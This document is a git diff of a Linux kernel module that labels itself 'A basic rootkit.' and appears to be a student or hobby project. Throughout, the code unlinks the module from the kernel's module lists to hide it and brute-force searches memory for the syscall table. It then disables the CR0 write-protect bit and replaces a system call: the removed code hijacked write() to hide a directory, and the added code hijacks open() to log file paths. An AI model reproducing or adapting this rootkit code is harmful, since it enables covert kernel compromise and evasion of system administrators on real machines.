@@ -14,16 +14,16 @@ MODULE_AUTHOR("Richard Kavanagh <richard.kavanagh7@mail.dcu.ie>");
 MODULE_DESCRIPTION("A basic rootkit.");
 
 
-
 /* Old stystem call function prototype. */
-asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
+asmlinkage int (*original_open)(const char *pathname, int flags);
 
-/* Our new system call function prototype.  */
-asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count);
-
+/* New system call prototype. */
+asmlinkage int hidden_open(const char *pathname, int flags);
 
 unsigned long **sys_call_table;
 
+/* Ensure file is only read once. */
+int highjacked = 1;
 
 static unsigned long **get_sys_call_table(void)
 {
@@ -31,39 +31,31 @@ static unsigned long **get_sys_call_table(void)
     unsigned long **sct;
 
     printk("Beginning brute force seach for Syscall table at location: %lx\n", offset);
-
-    while (offset < ULLONG_MAX) {
-      
+    while (offset < ULLONG_MAX) 
+    {
         sct = (unsigned long **)offset;
         /* Searching for bit pattern that matches sct[__NR_close]. */
-        if (sct[__NR_close] == (unsigned long *) sys_close) {
-            printk(KERN_INFO "Syscall table found at: %lx\n", offset);
+        if (sct[__NR_close] == (unsigned long *) sys_close) 
+        {
+            printk(KERN_INFO "Syscall table found at location: %lx\n", offset);
             return sct;
         }
-
         offset += sizeof(void *);
     }
     return NULL;
 }
 
 
-asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
+char *fileType = ".mp3";
 
-asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count) {
+asmlinkage int hidden_open(const char *pathname, int flags) {
 
-    char *protected_name = ".kernel-dev";
-    char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* Allocate kernel memory for memory from userland. */
-    copy_from_user(kbuff,buff,255); /* Copy the userland moduleemory to the kernel memory allocation. */
-
-    /* Check does the write contain the protected directory name. */
-    if (strstr(kbuff,protected_name)) { 
-        kfree(kbuff);
-        /* Hide ls write error with ENOTDIR/ENOENT and return file exists error. */
-        return EEXIST; 
+    if(strstr(pathname, fileType) != NULL && highjacked != 0) 
+    {
+        printk(KERN_INFO "%s\n", pathname);
+        highjacked = 0;
     }
-    /* Otherwise return data from original write system call. */
-    return o_write(fd,buff,count); 
-
+    return (*original_open)(pathname, flags);
 }
 
 
@@ -72,11 +64,11 @@ static int __init hidden_init(void)
 
     printk(KERN_INFO "Starting up module.\n");
 
-    /*
     /* Hide the module from proc/modules, Sys/modules tracking. */
+    
     list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
-
+    
     /* Locate address of the Syscall table in memory. */
     if(!(sys_call_table = get_sys_call_table())) {
         printk(KERN_INFO "Unable to locate Syscall table.");
@@ -85,12 +77,12 @@ static int __init hidden_init(void)
 
     /* Disabling WP bit in control register cr0 to write to sys_call table. */
     write_cr0(read_cr0() & (~ 0x10000));
+    
+    /* Store open system call to use later. */
+    original_open = (void *)sys_call_table[__NR_open];
 
-    /* Storing the system to restore it after */
-    ref_sys_write = (void *)sys_call_table[__NR_write];
-
-    // write our modified read call to the syscall table
-    sys_call_table[__NR_write] = (unsigned long *)hidden_write;
+    /* Write our modified read call to the syscall table. */
+    sys_call_table[__NR_open] = (unsigned long *) hidden_open;  
 
     /* Turning WP bit back on. */
     write_cr0(read_cr0() | 0x10000); 
@@ -100,15 +92,20 @@ static int __init hidden_init(void)
  
 static void __exit hidden_cleanup(void)
 {
+    /* Exit without cleaning up module. */
+    if (!sys_call_table)
+    {
+        return;
+    }
+
     printk(KERN_INFO "Cleaning up module.\n");
 
-     /* Disabling WP bit in control register cr0 to revert changes. */
+    /* Disabling WP bit in control register cr0 to revert changes. */
     write_cr0(read_cr0() & (~ 0x10000));
 
-    //xchg(&sys_call_table[__NR_write],o_write);
-
-    sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
-
+    /* Revert to original open system call. */
+    sys_call_table[__NR_open] = (unsigned long *) original_open;  
+    
     /* Revert cr0 to WP only. */
     write_cr0(read_cr0() | 0x10000); 
 }
